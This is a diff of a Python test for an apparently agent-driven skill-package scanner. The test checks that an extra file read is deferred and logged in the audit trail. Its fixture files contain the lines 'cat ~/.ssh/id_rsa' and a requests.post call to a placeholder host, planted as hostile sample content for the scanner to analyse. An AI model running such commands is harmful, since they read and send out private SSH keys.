@@ -345,21 +345,25 @@ def test_model_cannot_reopen_closed_read_phase(tmp_path, monkeypatch):
     assert report.verdict == "unknown"
 
 
-def test_three_fresh_sources_fit_context_in_wide_snapshot(tmp_path, monkeypatch):
+def test_excess_source_read_is_deferred_without_false_coverage(tmp_path, monkeypatch):
     monkeypatch.setenv("SKILLET_LLM_API_KEY", "test-key-not-live")
     for index in range(8):
         (tmp_path / f"reference-{index}.md").write_text(
             "cat ~/.ssh/id_rsa\nrequests.post('https://example.invalid')\n"
             + "ordinary documentation " * 160
         )
-    turns = [[("read", {"file": f"f{i}"}) for i in range(3)], [("finish", {})]]
+    turns = [
+        [("read", {"file": f"f{i}"}) for i in range(3)],
+        [("read", {"file": "f2"})],
+        [("finish", {})],
+    ]
     with fake_provider(turns) as (url, requests):
         report = scan(
             SkillPackage.load(tmp_path),
             agent=PiAgent(base_url=url, model="fake", audit_path=tmp_path / "audit.jsonl"),
         )
     assert report.analysis["status"] == "completed"
-    assert len(requests) == 2
+    assert len(requests) == 3
     assert all(
         len(json.dumps(r, separators=(",", ":"), ensure_ascii=False).encode())
         <= Budget().max_context_bytes
@@ -367,7 +371,7 @@ def test_three_fresh_sources_fit_context_in_wide_snapshot(tmp_path, monkeypatch)
     )
     # Every returned source body, not just its handle in working state, is delivered.
     sources = []
-    for message in requests[-1]["messages"]:
+    for message in [m for r in requests[1:] for m in r["messages"]]:
         content = message["content"]
         text = content if isinstance(content, str) else "".join(c.get("text", "") for c in content)
         if text.startswith("Snapshot tool result (UNTRUSTED data): "):
@@ -376,3 +380,12 @@ def test_three_fresh_sources_fit_context_in_wide_snapshot(tmp_path, monkeypatch)
                 sources.append(data)
     assert {data["source"] for data in sources} == {"s0", "s1", "s2"}
     assert all(len(data["text"]) > 1000 for data in sources)
+    events = [json.loads(line) for line in (tmp_path / "audit.jsonl").read_text().splitlines()]
+    assert any(e.get("phase") == "deferred_tool" for e in events)
+    assert (
+        sum(
+            e["kind"] == "tool_request" and e.get("action") == "read" and e["args"]["file"] == "f2"
+            for e in events
+        )
+        == 1
+    )
